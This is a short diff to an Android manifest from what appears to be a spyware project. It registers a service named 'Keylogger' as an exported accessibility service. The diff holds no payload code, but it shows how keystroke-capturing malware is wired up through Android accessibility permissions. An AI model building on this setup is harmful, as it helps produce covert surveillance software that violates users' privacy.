@@ -25,7 +25,8 @@
             </intent-filter>
         </activity>
 
-        <service android:name=".Keylogger"
+        <service android:name="com.example.cristianturetta.spyware.Keylogger"
+            android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="@string/accessibility_service_label">
             <intent-filter>
